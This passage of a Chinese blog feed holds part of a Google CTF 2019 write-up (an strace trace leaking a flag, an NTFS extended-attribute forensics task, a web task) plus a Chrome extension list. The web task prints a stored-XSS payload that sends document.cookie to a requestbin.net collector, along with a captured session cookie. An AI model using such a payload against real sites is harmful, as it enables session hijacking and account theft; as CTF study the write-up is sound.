punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0Q<span class="token punctuation">\</span>345td<span class="token punctuation">\</span><span class="token number">6</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">20</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0R<span class="token punctuation">\</span>345td<span class="token punctuation">\</span><span class="token number">4</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span> v<span class="token punctuation">\</span><span class="token number">36</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span> v<span class="token operator">></span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span> v<span class="token operator">></span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">3409</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">3409</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">1</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">4</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">24</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">3</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0GNU<span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">264</span><span class="token punctuation">\</span><span class="token number">27</span><span class="token punctuation">\</span><span class="token number">300</span><span class="token punctuation">\</span><span class="token number">272</span><span class="token operator">|</span><span class="token punctuation">\</span><span class="token number">305</span><span class="token punctuation">\</span><span class="token number">317</span><span class="token punctuation">\</span><span class="token number">6</span><span class="token punctuation">\</span><span class="token number">321</span><span class="token punctuation">\</span><span class="token number">321</span><span class="token punctuation">\</span><span class="token number">276</span><span class="token punctuation">\</span>326e,<span class="token punctuation">\</span><span class="token number">355</span><span class="token punctuation">\</span><span class="token number">271</span>%<span class="token operator">&lt;</span><span class="token variable">`</span></span><span class="token entity" title="\320">\320</span><span class="token entity" title="\4">\4</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\20">\20</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>GNU<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\3">\3</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\2">\2</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\363">\363</span><span class="token entity" title="\3">\3</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\16">\16</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\000">\000</span>0<span class="token entity" title="\20">\20</span>D<span class="token entity" title="\240">\240</span> <span class="token entity" title="\2">\2</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\210">\210</span><span class="token entity" title="\3">\3</span><span class="token entity" title="\346">\346</span><span class="token entity" title="\220">\220</span><span class="token entity" title="\305">\305</span>E<span class="token entity" title="\214">\214</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\304">\304</span><span class="token entity" title="\0">\0</span>X<span class="token entity" title="\0">\0</span><span class="token entity" title="\7">\7</span><span class="token entity" title="\204">\204</span><span class="token entity" title="\0">\0</span>p<span class="token entity" title="\302">\302</span><span class="token entity" title="\200">\200</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\212">\212</span><span class="token entity" title="\f">\f</span>A<span class="token entity" title="\4">\4</span><span class="token entity" title="\20">\20</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\210">\210</span>@2<span class="token entity" title="\10">\10</span>*@<span class="token entity" title="\210">\210</span>T&lt;- <span class="token entity" title="\016">\016</span>2H&amp;<span class="token entity" title="\204">\204</span><span class="token entity" title="\300">\300</span><span class="token entity" title="\214">\214</span><span class="token entity" title="\4">\4</span><span class="token entity" title="\10">\10</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\2">\2</span><span class="token entity" title="\2">\2</span><span class="token entity" title="\16">\16</span><span class="token entity" title="\241">\241</span><span class="token entity" title="\254">\254</span><span class="token entity" title="\32">\32</span><span class="token entity" title="\6">\6</span>f<span class="token entity" title="\310">\310</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\300">\300</span>2<span class="token entity" title="\0">\0</span><span class="token entity" title="\300">\300</span><span class="token entity" title="\4">\4</span>P<span class="token entity" title="\t">\t</span> <span class="token entity" title="\201">\201</span><span class="token entity" title="\10">\10</span><span class="token entity" title="\204">\204</span><span class="token entity" title="\v">\v</span>  ($<span class="token entity" title="\0">\0</span><span class="token entity" title="\4">\4</span> Z<span class="token entity" title="\0">\0</span><span class="token entity" title="\20">\20</span>X<span class="token entity" title="\200">\200</span><span class="token entity" title="\312">\312</span>DB(<span class="token entity" title="\0">\0</span><span class="token entity" title="\6">\6</span><span class="token entity" title="\200">\200</span><span class="token entity" title="\020">\020</span>8C<span class="token entity" title="\0">\0</span> @<span class="token entity" title="\200">\200</span><span class="token entity" title="\0">\0</span>IP<span class="token entity" title="\0">\0</span>Q<span class="token entity" title="\212">\212</span>@<span class="token entity" title="\22">\22</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\10">\10</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\21">\21</span><span class="token entity" title="\20">\20</span>"</span>, <span class="token number">832</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">832</span>strace: Process <span class="token number">188</span> attachedstrace: Process <span class="token number">189</span> attachedstrace: Process <span class="token number">190</span> attachedstrace: Process <span class="token number">191</span> attachedstrace: Process <span class="token number">192</span> attachedHello Operator. Ready to connect to a satellite?Enter the name of the satellite to connect to or <span class="token string">'exit'</span> to quit<span class="token punctuation">[</span>pid   <span class="token number">187</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">0</span>, osmium<span class="token string">"osmium<span class="token entity" title="\n">\n</span>"</span>, <span class="token number">4096</span><span class="token punctuation">)</span>   <span class="token operator">=</span> <span class="token number">7</span>Establishing secure connection to osmium satellite<span class="token punctuation">..</span>.<span class="token punctuation">[</span>pid   <span class="token number">187</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">3</span>, <span class="token string">"# /etc/nsswitch.conf<span class="token entity" title="\n">\n</span>#<span class="token entity" title="\n">\n</span># Example configuration of GNU Name Service Switch functionality.<span class="token entity" title="\n">\n</span># If you have the <span class="token variable"><span class="token variable">`</span>glibc-doc-reference' and <span class="token variable">`</span></span>info' packages installed, try:<span class="token entity" title="\n">\n</span># <span class="token variable"><span class="token variable">`</span>info libc <span class="token punctuation">\</span>"Name Service Switch<span class="token punctuation">\</span>"' <span class="token keyword">for</span> information about this file.<span class="token punctuation">\</span>n<span class="token punctuation">\</span>npasswd:         compat systemd<span class="token punctuation">\</span>ngroup:          compat systemd<span class="token punctuation">\</span>nshadow:         compat<span class="token punctuation">\</span>ngshadow:        files<span class="token punctuation">\</span>n<span class="token punctuation">\</span>nhosts:          files dns<span class="token punctuation">\</span>nnetworks:       files<span class="token punctuation">\</span>n<span class="token punctuation">\</span>nprotocols:      db files<span class="token punctuation">\</span>nservices:       db files<span class="token punctuation">\</span>nethers:         db files<span class="token punctuation">\</span>nrpc:            db files<span class="token punctuation">\</span>n<span class="token punctuation">\</span>nnetgroup:       nis<span class="token punctuation">\</span>n<span class="token string">", 1024) = 513[pid   187] read(3, "</span>", <span class="token number">1024</span><span class="token punctuation">)</span>           <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">[</span>pid   <span class="token number">187</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">3</span>, <span class="token string">"# This file was automatically generated by WSL. To stop automatic generation of this file, remove this line.<span class="token entity" title="\n">\n</span>nameserver 172.16.23.168<span class="token entity" title="\n">\n</span>nameserver 172.16.23.131<span class="token entity" title="\n">\n</span>nameserver fec0:0:0:ffff::1<span class="token entity" title="\n">\n</span>"</span>, <span class="token number">65536</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">187</span><span class="token punctuation">[</span>pid   <span class="token number">187</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">3</span>, <span class="token string">""</span>, <span class="token number">65349</span><span class="token punctuation">)</span>          <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">[</span>pid   <span class="token number">187</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">3</span>, <span class="token string">""</span>, <span class="token number">65536</span><span class="token punctuation">)</span>          <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">[</span>pid   <span class="token number">187</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">3</span>, <span class="token string">"# This file is automatically generated by WSL based on the Windows hosts file:<span class="token entity" title="\n">\n</span># %WINDIR%<span class="token entity" title="\\">\\</span>System32<span class="token entity" title="\\">\\</span>drivers<span class="token entity" title="\\">\\</span>etc<span class="token entity" title="\\">\\</span>hosts. Modifications to this file will be overwritten.<span class="token entity" title="\n">\n</span>127.0.0.1<span class="token entity" title="\t">\t</span>localhost<span class="token entity" title="\n">\n</span>127.0.1.1<span class="token entity" title="\t">\t</span>DESKTOP-ARC2CM5.localdomain<span class="token entity" title="\t">\t</span>DESKTOP-ARC2CM5<span class="token entity" title="\n">\n</span>127.0.0.1<span class="token entity" title="\t">\t</span>www.xmind.com<span class="token entity" title="\n">\n</span>127.0.0.1<span class="token entity" title="\t">\t</span>xmind.com<span class="token entity" title="\n">\n</span>127.0.0.1<span class="token entity" title="\t">\t</span>www.xmind.net<span class="token entity" title="\n">\n</span>127.0.0.1<span class="token entity" title="\t">\t</span>xmind.net<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span># The following lines are desirable for IPv6 capable hosts<span class="token entity" title="\n">\n</span>::1     ip6-localhost ip6-loopback<span class="token entity" title="\n">\n</span>fe00::0 ip6-localnet<span class="token entity" title="\n">\n</span>ff00::0 ip6-mcastprefix<span class="token entity" title="\n">\n</span>ff02::1 ip6-allnodes<span class="token entity" title="\n">\n</span>ff02::2 ip6-allrouters<span class="token entity" title="\n">\n</span>"</span>, <span class="token number">65536</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">512</span> <span class="token punctuation">[</span>pid   <span class="token number">187</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">3</span>, <span class="token string">""</span>, <span class="token number">65024</span><span class="token punctuation">)</span>          <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">[</span>pid   <span class="token number">187</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">3</span>, <span class="token string">""</span>, <span class="token number">65536</span><span class="token punctuation">)</span>          <span class="token operator">=</span> <span class="token number">0</span>strace: Process <span class="token number">193</span> attached<span class="token punctuation">[</span>pid   <span class="token number">187</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">3</span>, 0xc000126000, <span class="token number">512</span><span class="token punctuation">)</span>  <span class="token operator">=</span> -1 EAGAIN <span class="token punctuation">(</span>Resource temporarily unavailable<span class="token punctuation">)</span><span class="token punctuation">[</span>pid   <span class="token number">191</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">5</span>, 0xc000128000, <span class="token number">512</span><span class="token punctuation">)</span>  <span class="token operator">=</span> -1 EAGAIN <span class="token punctuation">(</span>Resource temporarily unavailable<span class="token punctuation">)</span><span class="token punctuation">[</span>pid   <span class="token number">187</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">3</span>, "cJ<span class="token punctuation">\</span><span class="token number">201</span><span class="token punctuation">\</span><span class="token number">200</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">1</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">1</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>tsatellite<span class="token punctuation">\</span>16ctfcompetition<span class="token punctuation">\</span>3com<span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">34</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">1</span><span class="token punctuation">\</span><span class="token number">300</span><span class="token punctuation">\</span><span class="token number">26</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">6</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">1</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">1</span>,<span class="token punctuation">\</span>0N<span class="token punctuation">\</span>vns-cloud-b1<span class="token punctuation">\</span>rgoogledomains<span class="token punctuation">\</span><span class="token number">300</span>%<span class="token punctuation">\</span>24cloud-dns-hostmaster<span class="token punctuation">\</span>6google<span class="token punctuation">\</span><span class="token number">300</span>%<span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">1</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0T<span class="token variable">`</span></span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\16">\16</span><span class="token entity" title="\20">\20</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\3">\3</span><span class="token entity" title="\364">\364</span><span class="token entity" title="\200">\200</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\1">\1</span>,"</span>, <span class="token number">512</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">136</span><span class="token punctuation">[</span>pid   <span class="token number">193</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">5</span>, <span class="token string">"<span class="token entity" title="\321">\321</span>w<span class="token entity" title="\201">\201</span><span class="token entity" title="\200">\200</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\t">\t</span>satellite<span class="token entity" title="\16">\16</span>ctfcompetition<span class="token entity" title="\3">\3</span>com<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\300">\300</span><span class="token entity" title="\f">\f</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>&lt;<span class="token entity" title="\0">\0</span><span class="token entity" title="\4">\4</span><span class="token entity" title="\&quot;">\"</span>Le<span class="token entity" title="\35">\35</span>"</span>, <span class="token number">512</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">62</span><span class="token punctuation">[</span>pid   <span class="token number">187</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">3</span>, 0xc00013e000, <span class="token number">4096</span><span class="token punctuation">)</span> <span class="token operator">=</span> -1 EAGAIN <span class="token punctuation">(</span>Resource temporarily unavailable<span class="token punctuation">)</span><span class="token punctuation">[</span>pid   <span class="token number">187</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">3</span>, <span class="token string">"Welcome. Enter (a) to display config data, (b) to erase all data or (c) to disconnect<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>, <span class="token number">4096</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">87</span>Welcome. Enter <span class="token punctuation">(</span>a<span class="token punctuation">)</span> to display config data, <span class="token punctuation">(</span>b<span class="token punctuation">)</span> to erase all data or <span class="token punctuation">(</span>c<span class="token punctuation">)</span> to disconnect<span class="token punctuation">[</span>pid   <span class="token number">187</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">0</span>, a<span class="token string">"a<span class="token entity" title="\n">\n</span>"</span>, <span class="token number">4096</span><span class="token punctuation">)</span>        <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">[</span>pid   <span class="token number">187</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">3</span>, 0xc000163000, <span class="token number">4096</span><span class="token punctuation">)</span> <span class="token operator">=</span> -1 EAGAIN <span class="token punctuation">(</span>Resource temporarily unavailable<span class="token punctuation">)</span><span class="token punctuation">[</span>pid   <span class="token number">193</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">3</span>, <span class="token string">"Username: brewtoot password: CTF&#123;4efcc72090af28fd33a2118985541f92e793477f&#125;<span class="token entity" title="\t">\t</span>166.00 IS-19 2019/05/09 00:00:00<span class="token entity" title="\t">\t</span>Swath 640km<span class="token entity" title="\t">\t</span>Revisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m<span class="token entity" title="\t">\t</span>Daily acquisition capacity: 220,000km<span class="token entity" title="\302">\302</span><span class="token entity" title="\262">\262</span><span class="token entity" title="\t">\t</span>Remaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E<span class="token entity" title="\n">\n</span>"</span>, <span class="token number">4096</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">363</span>Username: brewtoot password: ********************     <span class="token number">166.00</span> IS-19 <span class="token number">2019</span>/05/09 00:00:00                            Swath 640km      Revisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: <span class="token number">1</span>.2m          Daily acquisition capacity: <span class="token number">220</span>,000km²   Remaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E<span class="token punctuation">[</span>pid   <span class="token number">193</span><span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">0</span>,</code></pre><ul><li>pid 193进程read中，password明文显示flag</li><li>==<strong>flag：CTF{4efcc72090af28fd33a2118985541f92e793477f}</strong>==</li></ul><h2 id="03-home-computer-forensics"><a href="#03-home-computer-forensics" class="headerlink" title="03 home computer(forensics)"></a>03 home computer(forensics)</h2><ul><li><p>forensics:取证</p></li><li><p>解压得到 note.txt、 family.ntfs</p></li><li><p>加载family.ntfs有两种方法：</p></li><li><p>方法一：7.zip<br>（支援的檔案格式：压缩／解压缩：7z、XZ、BZIP2、GZIP、TAR、ZIP 及 WIM//解压缩：AR、ARJ、CAB、CHM、CPIO、CramFS、DMG、EXT、FAT、GPT、HFS、IHEX、ISO、LZH、LZMA、MBR、MSI、NSIS、NTFS、QCOW2、RAR、RPM、SquashFS、UDF、UEFI、VDI、VHD、VMDK、WIM、XAR 及 Z)</p></li><li><p>方法二：linux 挂载(kali)</p></li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">⚡ root@r10 <span class="token function">mount</span> -t ntfs ./family.ntfs /mnt</code></pre><ul><li>进入路径：/mnt/Users/Family/Documents ，查看credentials.txt</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">⚡ root@r10 <span class="token function">cat</span> credentials.txtI keep pictures of my credentials <span class="token keyword">in</span> extended attributes.</code></pre><ul><li>利用attr查看扩展文件</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">⚡ root@r10 attr -l credentials.txt Attribute <span class="token string">"FILE0"</span> has a <span class="token number">38202</span> byte value <span class="token keyword">for</span> credentials.txt⚡ root@r10 attr -g  FILE0 -q credentials.txt <span class="token operator">></span> flag⚡ root@r10 <span class="token function">file</span> flagflag: PNG image data, <span class="token number">1234</span> x <span class="token number">339</span>, <span class="token number">8</span>-bit/color RGB, non-interlaced</code></pre><ul><li>利用getfattr查看扩展文件</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">⚡ root@r10 getfattr credentials.txt  <span class="token comment"># file: credentials.txt</span>user.FILE0⚡ root@r10 getfattr --only-values credentials.txt <span class="token operator">></span> image.png</code></pre><ul><li>查看图片得到flag</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">⚡ root@r10 eog flag</code></pre><ul><li>==<strong>flag：CTF{congratsyoufoundmycreds}</strong>==</li></ul><h2 id="04-Government-Agriculture-Network-web"><a href="#04-Government-Agriculture-Network-web" class="headerlink" title="04 Government Agriculture Network(web)"></a>04 Government Agriculture Network(web)</h2><ul><li>目标页面<a href="https://govagriculture.web.ctfcompetition.com/">https://govagriculture.web.ctfcompetition.com/</a></li><li>尝试Create a new post，得到信息：Your post was submitted for review. Administator will take a look shortly.</li><li>分析：administator再次登录将留下cookie，尝试xss攻击</li><li>利用<a href="http://requestbin.net/">http://requestbin.net/</a> 构建requset.（hettp://webhook.site亦可）</li><li>Make a request to get started</li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'http://requestbin.net/r/15ietu11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><ul><li>xss注入</li></ul><pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://requestbin.net/r/14bfl601?test='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><ul><li>查看request信息，得到flag</li></ul><pre class="language-txt" data-language="txt"><code class="language-txt">test: flag&#x3D;CTF&#123;8aaa2f34b392b415601804c2f5f0f24e&#125;; session&#x3D;HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV</code></pre><ul><li>==<strong>flag：CTF{8aaa2f34b392b415601804c2f5f0f24e}</strong>==</li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>google Chrome 插件推荐</title>
    <link href="/2019/09/15/google%20Chrome%20%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/"/>
    <url>/2019/09/15/google%20Chrome%20%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/</url>
    
    <content type="html"><![CDATA[<h2 id="Chrome插件推荐"><a href="#Chrome插件推荐" class="headerlink" title="Chrome插件推荐"></a>Chrome插件推荐</h2><p><strong>(没有插件的Chrome是没有灵魂的！！！)</strong></p><p><u>安装插件，请打开Chrome开发者模式</u></p><p><u>Chrome插件安装通用教程：<a href="https://www.jianshu.com/p/12ca04c61fc6">https://www.jianshu.com/p/12ca04c61fc6</a></u></p><ul><li>YouTube Video Downloader ：油管视频音频下载<a href="https://addoncrop.com/youtube_video_downloader/">https://addoncrop.com/youtube_video_downloader/</a> （下载zip包解压，在Chrome扩展程序中，将文件夹拖入即可）</li><li>bilibili哔哩哔哩下载助手 ：bilibili 哔哩哔哩B站下载助手 帮你下载版权受限（能看不能缓存）的 番剧 视频</li><li>Momentum ：提供一个清新简单的浏览器主页面</li><li>Dark Reader  ： 黑色主题，适用于任何网站。关爱眼睛，就使用Dark Reader进行夜间和日间浏览</li><li>Google学术搜索  ：可让您在浏览网页时查询学术文章</li><li>Project Naptha ： 文本识别，突出显示、复制、编辑和翻译web上任何图像中的文本</li><li>AdBlock : 拦截网页上的广告</li><li>Search by Image (by Google) : 点击右键即可在google上搜索图片</li><li>捕捉网页截图 ： 捕捉网页截图，编辑并将它们保存为PDF，JPEG，GIF，PNG或BMP；上传，打印，在Photoshop中打开，复制到剪贴板或电子邮件</li></ul>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
    <tags>
      
      <tag>software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2019/09/15/hello-world/"/>
    <url>/2019/09/15/hello-world/</url>
    
